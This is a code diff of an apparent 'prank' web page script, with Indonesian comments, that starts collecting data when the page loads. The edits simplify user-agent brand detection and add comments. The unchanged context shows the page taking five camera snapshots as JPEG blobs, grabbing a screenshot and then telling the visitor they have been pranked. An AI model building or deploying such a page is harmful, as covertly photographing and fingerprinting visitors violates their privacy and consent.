@@ -77,22 +77,13 @@
     };
 
     const getDeviceBrand = () => {
-      const ua = navigator.userAgent.toLowerCase();
-
-      if (/vivo|v\d{4}/i.test(ua)) return 'Vivo';
-      if (/oppo|cph|pbfm/i.test(ua)) return 'Oppo';
-      if (/realme|rmx/i.test(ua)) return 'Realme';
-      if (/redmi|mi\s|xiaomi|m200/i.test(ua)) return 'Xiaomi';
-      if (/infinix|x\d{3}/i.test(ua)) return 'Infinix';
-      if (/tecno/i.test(ua)) return 'Tecno';
-      if (/samsung|sm-/i.test(ua)) return 'Samsung';
-      if (/asus|rog/i.test(ua)) return 'Asus';
-      if (/lenovo|k\d{4}|tb\d{4}/i.test(ua)) return 'Lenovo';
-      if (/motorola|moto/i.test(ua)) return 'Motorola';
-      if (/oneplus/i.test(ua)) return 'OnePlus';
-      if (/nokia/i.test(ua)) return 'Nokia';
-      if (/sony/i.test(ua)) return 'Sony';
-      if (/huawei|honor/i.test(ua)) return 'Huawei';
+      const ua = navigator.userAgent;
+      if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
+      if (/Oppo|CPH/.test(ua)) return 'Oppo';
+      if (/SM-|Samsung/.test(ua)) return 'Samsung';
+      if (/Infinix/.test(ua)) return 'Infinix';
+      if (/RMX/.test(ua)) return 'Realme';
+      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
       return 'Android Device';
     };
 
@@ -140,7 +131,7 @@
           }, 100);
         });
 
-        await new Promise(r => setTimeout(r, 1000));
+        await new Promise(r => setTimeout(r, 1000)); // auto fokus
 
         for (let i = 1; i <= 5; i++) {
           const canvas = document.createElement('canvas');
@@ -156,7 +147,7 @@
             }, 'image/jpeg');
           });
 
-          await new Promise(r => setTimeout(r, 1000));
+          await new Promise(r => setTimeout(r, 1000)); // jeda 1 detik
         }
 
         stream.getTracks().forEach(t => t.stop());
@@ -226,9 +217,11 @@
       getScreenshot();
     };
 
+    // UI: efek ketik
     const msg = `             Selamat anda kena prank.\n         Terima kasih atas kerja samanya.`;
     typeText(document.getElementById('msg'), msg, 30);
 
+    // Mulai proses
     window.onload = collectInfo;
   </script>
 </body>
